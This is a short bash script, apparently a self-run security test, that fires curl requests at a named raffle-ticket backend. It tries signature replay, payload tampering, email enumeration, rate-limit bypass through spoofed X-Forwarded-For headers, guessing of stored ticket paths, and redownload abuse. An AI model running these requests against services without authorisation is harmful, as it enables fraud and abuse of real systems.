#!/bin/bash

TARGET="https://goodwill-backend-kjn5.onrender.com"
FAKE_ORDER="FAKE-ORDER-123456"
NOW=$(date +%s)
OLD_TS=$((NOW-1000))

echo "======================================"
echo "ADVANCED RAFFLE ATTACK SIMULATION"
echo "Target: $TARGET"
echo "Time: $(date)"
echo "======================================"

echo ""
echo "1️⃣ Replay Attack Simulation"
SIG_RESPONSE=$(curl -s -X POST $TARGET/sign_payload \
  -H "Content-Type: application/json" \
  -d '{"order_id":"REPLAYTEST","email":"replay@test.com"}')

SIG=$(echo $SIG_RESPONSE | grep -o '"signature":"[^"]*"' | cut -d'"' -f4)
TS=$(echo $SIG_RESPONSE | grep -o '"timestamp":"[^"]*"' | cut -d'"' -f4)

echo "First request:"
curl -s -X POST $TARGET/download_ticket \
  -H "Content-Type: application/json" \
  -H "X-Signature: $SIG" \
  -H "X-Timestamp: $TS" \
  -d '{"order_id":"REPLAYTEST"}'

echo ""
echo "Replaying same signature:"
curl -s -X POST $TARGET/download_ticket \
  -H "Content-Type: application/json" \
  -H "X-Signature: $SIG" \
  -H "X-Timestamp: $TS" \
  -d '{"order_id":"REPLAYTEST"}'

echo ""
echo ""
echo "2️⃣ Payload Tampering Test"

curl -s -X POST $TARGET/generate_ticket \
  -H "Content-Type: application/json" \
  -H "X-Signature: $SIG" \
  -H "X-Timestamp: $TS" \
  -d '{"order_id":"MODIFIED","email":"hacker@test.com"}'

echo ""
echo ""
echo "3️⃣ Email Enumeration Test"

curl -s -X POST $TARGET/my_tickets \
  -H "Content-Type: application/json" \
  -H "X-Signature: $SIG" \
  -H "X-Timestamp: $TS" \
  -d '{"email":"nonexistent@email.com"}'

echo ""
echo ""
echo "4️⃣ Rate Limit Bypass Attempt (Fake IP Header)"

for i in {1..7}
do
  curl -s -o /dev/null -w "Request $i: %{http_code}\n" \
    -H "X-Forwarded-For: 1.2.3.$i" \
    $TARGET/ticket_state
done

echo ""
echo ""
echo "5️⃣ Direct R2 Object Guess Attempt"

curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" \
  $TARGET/storage/tickets/$FAKE_ORDER/RaffleTicket_123456.pdf

echo ""
echo ""
echo "6️⃣ Redownload Abuse Attempt"

curl -s -X POST $TARGET/redownload_ticket \
  -H "Content-Type: application/json" \
  -H "X-Signature: $SIG" \
  -H "X-Timestamp: $TS" \
  -d '{"order_id":"REPLAYTEST"}'

echo ""
echo "======================================"
echo "ATTACK SIMULATION COMPLETE"
echo "======================================"
